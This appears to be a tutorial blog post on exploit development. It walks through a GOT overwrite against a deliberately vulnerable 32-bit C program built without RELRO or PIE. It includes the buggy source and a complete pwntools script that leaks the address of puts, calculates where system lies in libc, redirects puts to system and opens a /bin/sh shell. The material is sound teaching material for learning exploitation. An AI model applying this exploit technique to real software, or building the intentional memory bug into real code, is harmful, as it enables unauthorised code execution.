---
title: "Simple GOT Overwrite"
date: 2021-02-23T20:22:21-05:00
draft: true
subtitle: "Exploiting a basic vulnerability involving a GOT overwrite"
tags: ["got", "aslr", "easy", "elf", "libc"]
---

Modern Linux relies on a linker to match imported symbols to an external library, generally `libc.so`.  The process of overwriting entries in the Global Offset Table (GOT) can easily lead to controlled code execution.

<!--more-->

## Source Code and Target Executable

We are given the source code to a vulnerable binary, and need to exploit it in order to gain code execution by spawning a shell.  Because we are leveraging an information leak (ASLR bypass) for this vulnerability, we do not need to include it but it can easily be reproduced.

```c {linenos=table}
// got.c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>

struct record {
    char name[24];
    char * message;
};

int main() {
    puts("GOT Overwrite");

    // Create the struct record
    struct record student;
    strcpy(student.name, "Alice");
    student.message = (char *) malloc(sizeof(char) * 24);
    strcpy(student.message, "hello world");
    printf("Message from %s: (%s)\n", student.name, student.message);

    // Read some user data
    // Could leak the memory at student.message
    read(0, student.name, 28);
    printf("Message from %s: (%s)\n", student.name, student.message);

    // Overwrite the message
    // Could allow arbitary write at student.message
    read(0, student.message, 4);
    printf("Message from %s: (%s)\n", student.name, student.message);

    // Print the name again
    // The address of puts could have been changed to system
    // and student.name could be "/bin/sh"
    puts(student.name);
}
```

To compile the binary, we need to use `clang`.  In this case, it is preferred over GCC since recent Ubuntu versions of GCC do not respect `-fno-pie`.  We also want a 32-bit binary, so we specify `-m32`.  The flag `-Wl,-z,norelro` is sent to the linker, in order to disable the RELRO feature (a security mitigation to prevent GOT overwrite attacks).

```shell
$ clang -m32 -Wl,-z,norelro -o got got.c
```

We can verify with `pwn checksec` that the binary is not position-independent (i.e. does not use ASLR) and does not have RELRO:

```sh
$ pwn checksec got
[*] '/home/pwntools/got'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

## Exploitation Strategy

The target binary gives us the opportunity to leak four bytes of data by allowing us to fill the entire `record` structure via read, and specifically the field `record.message`.  It then prints the structure with `printf`, which allows us to leak data until a null terminator is encountered.

We can then write 4 bytes at the location `record.message` points, via the second `read` call.

Finally, we call `puts(student.name)`.  Our goal is to hijack the GOT entry for `puts` and have it instead invoke `system` where `student.name` is `/bin/sh\x00`.



## Exploit Script

Our exploit script starts by importing Pwntools, and setting `context.binary` which informs the rest of pwntools what architecture should be used by default.  This is important for challenges which are for 64-bit binaries, or generate assembly, but we do it here just for convenience.

Next the script starts the target process, and clears any existing output.  Since the binary is not position-independent (does not use ASLR), the *location* of the `puts` pointer is known ahead of time, and can be automatically calculated by using `ELF.got.puts`.

```python
from pwn import *

context.binary = e = ELF('got')

print("puts@got is at ", hex(e.got.puts))

# Start the process
io = e.process()
io.clean()
```

Next, we use the `fit()` functionality to create the `struct record student` on the heap.  Note that `fit()` fills any intermediary bytes with the `cyclic()` pattern for free, making it easy to determine what offsets one might need in the future.

`fit` is a very powerful tool and can create nested data structures.  `tube.fit` does this and automatically sends the data over the tube.  Since `io` here is a `process` tube, everything is automagic.  Note that we have to manunally specify a NUL byte terminator for `/bin/sh`.

```python
# We have 28 bytes, and 4 of them will be dumped
io.fit({
	0: '/bin/sh\x00',
	24: e.got.puts
})
```

### Memory Leak Details

Our goal is to leak the real address of `puts`, by leveraging its presence in the Global Offset Table.  The diagram looks somewhat like what's below.

```text
  record                                        
┌─────────┐                                     
│         │            Global Offset Table      
│         │         ┌───────────────────────┐   
│         │         │         puts          │   
│         │    ┌───▶│                       │──┐
│         │    │    ├───────────────────────┤  │
│  name   │    │    │        printf         │  │
│         │    │    │                       │  │
│         │    │    ├───────────────────────┤  │
│         │    │    │          ...          │  │
│         │  leak   │                       │  │
│         │    │    └───────────────────────┘  │
├─────────┤    │                               │
│         │    │                               │
│ message │────┘                               │
│         │                                    │
└─────────┘      ┌─────────────────────────────┘
                 │                              
libc.so.6────────┼───────────────────────────┐  
│  ┌─────┐       │             ┌───────┐     │  
│  │puts │◀──────┘             │system │     │  
│  └─────┘                     └───────┘     │  
│                                            │  
│              ┌───────┐                     │  
│              │printf │                     │  
│              └───────┘                     │  
└────────────────────────────────────────────┘  

```

The next bit of data will leak a pointer to `puts` from the GOT, so we clear all data until a `"("` appears, from the line:

```c {linenos=table, linenostart=26}
    printf("Message from %s: (%s)\n", student.name, student.message);
```

After that character, the next four bytes will be the REAL address of `puts` in libc.

```python
# Receive data until we get the open colon
io.recvuntil(b"(")

# Receive exactly four bytes of leaked data
got_puts = io.unpack()
info("puts@GOT == %#x" % got_puts)
io.clean()
```

### GOT Overwrite Details

Based on this address, we can load the same copy of libc as used by out target binary, find the OFFSET of `puts`, and use that to calculate the ACTUAL base address of `libc.so`.

With the real loaded address of libc set in `libc.address`, the address for `libc.symbols.system` is automatically updated, and we can use this to overwrite `puts` in the Global Offset Table.  From here forward, all calls to `puts()` will instead call `system()`

```python
# Calculate the base address of libc so we can calculate system()
libc = context.binary.libc
libc.address = got_puts - libc.symbols.puts

# Calculate system()
system = libc.symbols.system
info("system == %#x", system)
```

All that's left to do is to send the address of `system` which is read by the second call to `read` at 

```c {linenos=table, linenostart=30}
    read(0, student.message, 4);
```

And we can use `io.pack` to automatically convert it from an integer to a packed 32-bit value.

```python
io.pack(system)
```

The overwrite effectively replaces the GOT pointer for `puts` with `system`.

```text
  record                                            
┌─────────┐                                         
│         │                Global Offset Table      
│         │             ┌───────────────────────┐   
│         │             │         puts          │   
│         │      ┌─────▶│                       │──┐
│         │      │      ├───────────────────────┤  │
│  name   │      │      │        printf         │  │
│         │      │      │                       │  │
│         │      │      ├───────────────────────┤  │
│         │      │      │          ...          │  │
│         │  write 4    │                       │  │
│         │      │      └───────────────────────┘  │
├─────────┤      │                                 │
│         │      │                                 │
│ message │──────┘                                 │
│         │                                        │
└─────────┘                                        │
                                                   │
libc.so.6────────────────────────────────────┐     │
│  ┌─────┐                     ┌───────┐     │     │
│  │puts │                     │system │◀────┼─────┘
│  └─────┘                     └───────┘     │      
│                                            │      
│              ┌───────┐                     │      
│              │printf │                     │      
│              └───────┘                     │      
└────────────────────────────────────────────┘      

```

### Getting a Shell

Finally, we can get a shell after clearing any unnecesssary output and spawn an interactive shell.

```python
# Have an interactive shell to get the flag
io.clean()
io.interactive()
```

We then get a shell, and can read the flag.

```sh
$ cat flag.txt
Flag{This_Is_The_Flag}
```

